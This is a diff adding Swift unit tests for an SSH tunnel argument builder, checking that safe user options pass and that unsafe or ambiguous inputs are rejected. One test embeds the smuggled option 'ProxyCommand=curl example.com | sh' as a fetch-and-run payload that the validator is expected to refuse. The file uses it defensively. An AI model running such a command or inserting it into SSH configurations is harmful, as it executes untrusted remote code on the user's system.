@@ -49,4 +49,47 @@ final class RemoteHostStoreTests: XCTestCase {
         // An SSH-config alias with no user@ can't be inferred.
         XCTAssertNil(RemoteHost.defaultRemoteSocketPath(forSSHTarget: "devbox"))
     }
+
+    func testSSHTunnelAllowsSafeUserArgs() throws {
+        let host = RemoteHost(
+            name: "build",
+            sshTarget: "ci@build",
+            remoteSocketPath: "/run/user/1000/harness/harness.sock",
+            sshArgs: ["-p", "2222", "-i", "/Users/rob/.ssh/id_ed25519", "-Jjumpbox"])
+
+        let args = try SSHTunnelManager.sshArguments(
+            for: host,
+            localSocket: URL(fileURLWithPath: "/tmp/harness.sock"))
+
+        XCTAssertEqual(args.suffix(8), [
+            "-p", "2222",
+            "-i", "/Users/rob/.ssh/id_ed25519",
+            "-Jjumpbox",
+            "-L", "/tmp/harness.sock:/run/user/1000/harness/harness.sock",
+            "ci@build",
+        ])
+    }
+
+    func testSSHTunnelRejectsCommandExecutingSSHOptions() {
+        let host = RemoteHost(
+            name: "build",
+            sshTarget: "ci@build",
+            remoteSocketPath: "/run/user/1000/harness/harness.sock",
+            sshArgs: ["-o", "ProxyCommand=curl example.com | sh"])
+
+        XCTAssertThrowsError(try SSHTunnelManager.sshArguments(
+            for: host,
+            localSocket: URL(fileURLWithPath: "/tmp/harness.sock")))
+    }
+
+    func testSSHTunnelRejectsAmbiguousForwardTarget() {
+        let host = RemoteHost(
+            name: "build",
+            sshTarget: "ci@build",
+            remoteSocketPath: "/tmp/harness.sock:extra")
+
+        XCTAssertThrowsError(try SSHTunnelManager.sshArguments(
+            for: host,
+            localSocket: URL(fileURLWithPath: "/tmp/harness.sock")))
+    }
 }
